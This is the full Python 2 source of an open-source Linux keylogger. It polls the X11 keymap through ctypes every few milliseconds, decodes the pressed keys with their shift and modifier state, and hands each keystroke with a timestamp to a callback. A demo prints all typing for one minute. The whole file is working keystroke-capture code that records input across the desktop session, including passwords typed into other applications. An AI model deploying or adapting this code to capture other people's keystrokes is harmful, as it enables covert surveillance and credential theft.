# Copyright (c) 2011, Andrew Moffat
# All rights reserved.

# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#     * Redistributions of source code must retain the above copyright
#       notice, this list of conditions and the following disclaimer.
#     * Redistributions in binary form must reproduce the above copyright
#       notice, this list of conditions and the following disclaimer in the
#       documentation and/or other materials provided with the distribution.
#     * Neither the name of the <organization> nor the
#       names of its contributors may be used to endorse or promote products
#       derived from this software without specific prior written permission.

# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

# from: https://github.com/amoffat/pykeylogger

import sys
from time import sleep, time
import ctypes as ct
from ctypes.util import find_library


# linux only!
assert("linux" in sys.platform)


x11 = ct.cdll.LoadLibrary(find_library("X11"))
display = x11.XOpenDisplay(None)


# this will hold the keyboard state.  32 bytes, with each
# bit representing the state for a single key.
keyboard = (ct.c_char * 32)()

# these are the locations (byte, byte value) of special
# keys to watch
shift_keys = ((6,4), (7,64))
modifiers = {
    "left shift": (6,4),
    "right shift": (7,64),
    "left ctrl": (4,32),
    "right ctrl": (13,2),
    "left alt": (8,1),
    "right alt": (13,16)
}
last_pressed = set()
last_pressed_adjusted = set()
last_modifier_state = {}
caps_lock_state = 0

# key is byte number, value is a dictionary whose
# keys are values for that byte, and values are the
# keys corresponding to those byte values
key_mapping = {
    1: {
        0b00000010: "<esc>",
        0b00000100: ("1", "!"),
        0b00001000: ("2", "@"),
        0b00010000: ("3", "#"),
        0b00100000: ("4", "$"),
        0b01000000: ("5", "%"),
        0b10000000: ("6", "^"),
    },
    2: {
        0b00000001: ("7", "&"),
        0b00000010: ("8", "*"),
        0b00000100: ("9", "("),
        0b00001000: ("0", ")"),
        0b00010000: ("-", "_"),
        0b00100000: ("=", "+"),
        0b01000000: "<backspace>",
        0b10000000: "<tab>",
    },
    3: {
        0b00000001: ("q", "Q"),
        0b00000010: ("w", "W"),
        0b00000100: ("e", "E"),
        0b00001000: ("r", "R"),
        0b00010000: ("t", "T"),
        0b00100000: ("y", "Y"),
        0b01000000: ("u", "U"),
        0b10000000: ("i", "I"),
    },
    4: {
        0b00000001: ("o", "O"),
        0b00000010: ("p", "P"),
        0b00000100: ("[", "{"),
        0b00001000: ("]", "}"),
        0b00010000: "<enter>",
        #0b00100000: "<left ctrl>",
        0b01000000: ("a", "A"),
        0b10000000: ("s", "S"),
    },
    5: {
        0b00000001: ("d", "D"),
        0b00000010: ("f", "F"),
        0b00000100: ("g", "G"),
        0b00001000: ("h", "H"),
        0b00010000: ("j", "J"),
        0b00100000: ("k", "K"),
        0b01000000: ("l", "L"),
        0b10000000: (";", ":"),
    },
    6: {
        0b00000001: ("'", "\""),
        0b00000010: ("`", "~"),
        #0b00000100: "<left shift>",
        0b00001000: ("\\", "|"),
        0b00010000: ("z", "Z"),
        0b00100000: ("x", "X"),
        0b01000000: ("c", "C"),
        0b10000000: ("v", "V"),
    },
    7: {
        0b00000001: ("b", "B"),
        0b00000010: ("n", "N"),
        0b00000100: ("m", "M"),
        0b00001000: (",", "<"),
        0b00010000: (".", ">"),
        0b00100000: ("/", "?"),
        #0b01000000: "<right shift>",
    },
    8: {
        #0b00000001: "<left alt>",
        0b00000010: " ",
        0b00000100: "<caps lock>",
    },
    13: {
        #0b00000010: "<right ctrl>",
        #0b00010000: "<right alt>",
    },
}




def fetch_keys_raw():
    x11.XQueryKeymap(display, keyboard)
    return keyboard



def fetch_keys():
    global caps_lock_state, last_pressed, last_pressed_adjusted, last_modifier_state
    keypresses_raw = fetch_keys_raw()


    # check modifier states (ctrl, alt, shift keys)
    modifier_state = {}
    for mod, (i, byte) in modifiers.iteritems():
        modifier_state[mod] = bool(ord(keypresses_raw[i]) & byte)

    # shift pressed?
    shift = 0
    for i, byte in shift_keys:
        if ord(keypresses_raw[i]) & byte:
            shift = 1
            break

    # caps lock state
    if ord(keypresses_raw[8]) & 4: caps_lock_state = int(not caps_lock_state)


    # aggregate the pressed keys
    pressed = []
    for i, k in enumerate(keypresses_raw):
        o = ord(k)
        if o:
            for byte,key in key_mapping.get(i, {}).iteritems():
                if byte & o:
                    if isinstance(key, tuple): key = key[shift or caps_lock_state]
                    pressed.append(key)


    tmp = pressed
    pressed = list(set(pressed).difference(last_pressed))
    state_changed = tmp != last_pressed and (pressed or last_pressed_adjusted)
    last_pressed = tmp
    last_pressed_adjusted = pressed

    if pressed: pressed = pressed[0]
    else: pressed = None


    state_changed = last_modifier_state and (state_changed or modifier_state != last_modifier_state)
    last_modifier_state = modifier_state

    return state_changed, modifier_state, pressed

def fetch_keydowns():
    global caps_lock_state
    keypresses_raw = fetch_keys_raw()


    # check modifier states (ctrl, alt, shift keys)
    modifier_state = {}
    for mod, (i, byte) in modifiers.iteritems():
        modifier_state[mod] = bool(ord(keypresses_raw[i]) & byte)

    # shift pressed?
    shift = 0
    for i, byte in shift_keys:
        if ord(keypresses_raw[i]) & byte:
            shift = 1
            break

    # caps lock state
    if ord(keypresses_raw[8]) & 4: caps_lock_state = int(not caps_lock_state)


    # aggregate the pressed keys
    pressed = []
    for i, k in enumerate(keypresses_raw):
        o = ord(k)
        if o:
            for byte,key in key_mapping.get(i, {}).iteritems():
                if byte & o:
                    if isinstance(key, tuple): key = key[shift or caps_lock_state]
                    pressed.append(key)

    return modifier_state, pressed


def log(done, callback, sleep_interval=.005):
    while not done():
        sleep(sleep_interval)
        changed, modifiers, keys = fetch_keys()
        if changed: callback(time(), modifiers, keys)




if __name__ == "__main__":
    now = time()
    done = lambda: time() > now + 60
    def print_keys(t, modifiers, keys): print "%.2f   %r   %r" % (t, keys, modifiers)

    """Sample output:
    1314238675.42   'o'   {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False}
    1314238675.51   'm'   {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False}
    1314238675.65   'g'   {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False}
    """
    log(done, print_keys)
